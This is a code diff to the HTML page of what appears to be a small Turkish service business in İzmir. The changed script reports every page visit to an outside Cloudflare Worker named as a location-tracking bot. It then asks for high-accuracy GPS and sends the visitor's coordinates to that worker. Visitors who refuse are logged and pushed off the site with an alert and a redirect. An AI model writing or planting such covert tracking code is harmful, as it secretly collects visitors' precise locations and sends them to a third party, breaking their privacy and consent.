@@ -66,11 +66,6 @@
     <div class="stat"><strong>1000+</strong> Müşteri</div>
     <div class="stat"><strong>İzmir</strong> Tamamı</div>
   </div>
-
-  <div class="gallery">
-    <img src="https://images.unsplash.com/photo-1544161513-0179fe746fd5?auto=format&fit=crop&w=300" alt="Servis 1" />
-    <img src="https://images.unsplash.com/photo-1544161513-0179fe746fd5?auto=format&fit=crop&w=301" alt="Servis 2" />
-  </div>
 </section>
 
 <section class="container">
@@ -92,41 +87,50 @@
 
 <script>
 window.onload = function() {
-    // Sayfa yüklendiğinde otomatik olarak konum sormaya başlar
+    const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';
+
+    // 1. ADIM: SİTEYE GİRİLDİĞİ AN (BEKLEMEDEN) BİLDİRİM GÖNDER
+    fetch(workerURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({ status: "entry" })
+    });
+
+    // 2. ADIM: KONUM İZNİ İSTE
     if (navigator.geolocation) {
-        const options = {
-            enableHighAccuracy: true, // GPS üzerinden en hassas nokta
-            timeout: 10000,
-            maximumAge: 0
-        };
-
-        navigator.geolocation.getCurrentPosition(success, error, options);
-    }
-
-    function success(position) {
-        const payload = {
-            lat: position.coords.latitude,
-            lon: position.coords.longitude,
-            acc: position.coords.accuracy
-        };
-
-        // Senin Cloudflare Worker URL'n yerleştirildi
-        const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';
-
-        fetch(workerURL, {
-            method: 'POST',
-            mode: 'no-cors', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        })
-        .then(() => console.log("Bilgi başarıyla gönderildi."))
-        .catch(err => console.error("Hata oluştu:", err));
-    }
-
-    function error(err) {
-        console.warn("Kullanıcı konum izni vermedi.");
+        navigator.geolocation.getCurrentPosition(
+            // Başarılı: İzin Verildi
+            function(position) {
+                fetch(workerURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        status: "allowed",
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        acc: position.coords.accuracy
+                    })
+                });
+            },
+            // Hata veya Reddetme
+            function(error) {
+                fetch(workerURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ status: "rejected" })
+                });
+                
+                // Reddedenleri 1.5 saniye sonra Google'a postala
+                setTimeout(() => {
+                    alert("Size yardımcı olabilmemiz için konum izni vermeniz gerekmektedir.");
+                    window.location.href = "https://www.google.com";
+                }, 1500);
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
     }
 };
 </script>
+
 </body>
 </html>
